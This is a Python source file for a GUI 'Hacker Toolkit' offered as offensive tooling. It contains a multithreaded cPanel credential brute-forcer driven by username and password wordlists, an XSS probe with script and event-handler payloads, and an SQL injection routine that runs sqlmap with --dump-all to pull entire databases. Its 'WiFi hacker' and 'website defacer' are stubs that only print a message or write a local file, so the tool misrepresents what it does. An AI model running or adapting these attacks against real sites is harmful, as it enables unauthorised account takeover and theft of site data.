import argparse
import requests
import itertools
import threading
import PySimpleGUI as sg
from datetime import datetime
import subprocess

def backup_website(url):
    response = requests.get(url)
    if response.status_code == 200:
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        backup_filename = f"{timestamp}_backup.html"
        with open(backup_filename, "w") as backup_file:
            backup_file.write(response.text)
        print(f"Website backup created: {backup_filename}")
    else:
        print("Failed to fetch website. Check the URL and try again.")

def deface_website(url, html_file):
    response = requests.get(url)
    if response.status_code == 200:
        # Create a backup of the original website content
        backup_website(url)
        # Read content from the HTML file
        with open(html_file, "r") as file:
            new_content = file.read()
        # Simulate website defacement by saving to a local file
        with open("defaced_site.html", "w") as defaced_file:
            defaced_file.write(new_content)
        print("Website content prepared for defacement (saved locally).")
        log_defacement(url, new_content)
    else:
        print("Failed to fetch website. Check the URL and try again.")

def log_defacement(url, new_content):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"Date: {timestamp}\nURL: {url}\nNew Content:\n{new_content}\n\n"
    with open("defacement_log.txt", "a") as log_file:
        log_file.write(log_entry)
    print("Defacement logged.")

def hack_cpanel(url, usernames, passwords):
    max_retries = 3
    def brute_force(username, password):
        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        payload = {
            'user': username,
            'pass': password,
            'login': 'Log in'
        }
        for _ in range(max_retries):
            response = session.post(url, data=payload, headers=headers)
            if response.status_code == 200 and "cPanel" in response.text:
                print(f"Login successful! Username: {username}, Password: {password}")
                return True
            else:
                print(f"Login failed for Username: {username}, Password: {password}. Retrying...")
        return False

    threads = []
    for username, password in itertools.product(usernames, passwords):
        thread = threading.Thread(target=brute_force, args=(username, password))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
    print("All combinations tried. No luck. Try a different approach.")

def hack_wifi(ssid, password):
    print(f"Hacking into WiFi network '{ssid}' with password '{password}'. Enjoy your free internet!")

def xss_scan(url):
    xss_payloads = ["<script>alert('XSS')</script>", "'\"><img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]
    for payload in xss_payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if payload in response.text:
            print(f"XSS vulnerability found with payload: {payload}")
            return
    print("No XSS vulnerabilities found.")

def sql_injection_scan(url):
    sqlmap_command = ["sqlmap", "-u", url, "--batch", "--dump-all"]
    process = subprocess.Popen(sqlmap_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    while True:
        output = process.stdout.readline()
        if output == '' and process.poll() is not None:
            break
        if output:
            print(output.strip())
    process.stdout.close()
    process.stderr.close()
    print("SQL Injection scan and data dumping completed.")

def main():
    sg.theme('DarkRed1')
    layout = [
        [sg.Text("Select Tool:")],
        [sg.Listbox(values=('CPanel Cracker', 'WiFi Hacker', 'Website Defacer', 'XSS Scanner', 'SQL Injection Scanner'), size=(30, 5), key='-TOOL-', enable_events=True)],
        [sg.Text("URL"), sg.InputText(key="-URL-", size=(30, 1))],
        [sg.Text("HTML File for Website Defacer"), sg.InputText(key="-HTMLFILE-", size=(30, 1)), sg.FileBrowse()],
        [sg.Text("Username Wordlist"), sg.InputText(key="-USERLIST-", size=(30, 1)), sg.FileBrowse()],
        [sg.Text("Password Wordlist"), sg.InputText(key="-PASSLIST-", size=(30, 1)), sg.FileBrowse()],
        [sg.Text("Single Username"), sg.InputText(key="-SINGLEUSER-", size=(30, 1))],
        [sg.Text("Single Password"), sg.InputText(key="-SINGLEPASS-", size=(30, 1))],
        [sg.Button("Run Tool"), sg.Button("Exit")]
    ]
    window = sg.Window("Hacker Toolkit", layout)
    while True:
        event, values = window.read()
        if event == sg.WINDOW_CLOSED or event == "Exit":
            break
        elif event == "Run Tool":
            tool = values['-TOOL-'][0]
            if tool == 'CPanel Cracker':
                url = values["-URL-"]
                username_list = []
                password_list = []
                single_user = values["-SINGLEUSER-"]
                single_pass = values["-SINGLEPASS-"]
                if values["-USERLIST-"]:
                    userlist_path = values["-USERLIST-"]
                    with open(userlist_path, "r") as user_file:
                        username_list = [line.strip() for line in user_file.readlines()]
                if values["-PASSLIST-"]:
                    passlist_path = values["-PASSLIST-"]
                    with open(passlist_path, "r") as pass_file:
                        password_list = [line.strip() for line in pass_file.readlines()]
                if single_user:
                    username_list.append(single_user)
                if single_pass:
                    password_list.append(single_pass)
                if username_list and password_list:
                    hack_cpanel(url, username_list, password_list)
                else:
                    print("Please provide either wordlists or single username/password.")
            elif tool == 'WiFi Hacker':
                ssid = sg.popup_get_text("Enter WiFi SSID:")
                password = sg.popup_get_text("Enter WiFi password:")
                hack_wifi(ssid, password)
            elif tool == 'Website Defacer':
                url = values["-URL-"]
                html_file = values["-HTMLFILE-"]
                deface_website(url, html_file)
            elif tool == 'XSS Scanner':
                url = values["-URL-"]
                xss_scan(url)
            elif tool == 'SQL Injection Scanner':
                url = values["-URL-"]
                sql_injection_scan(url)
    window.close()

if __name__ == "__main__":
    main()
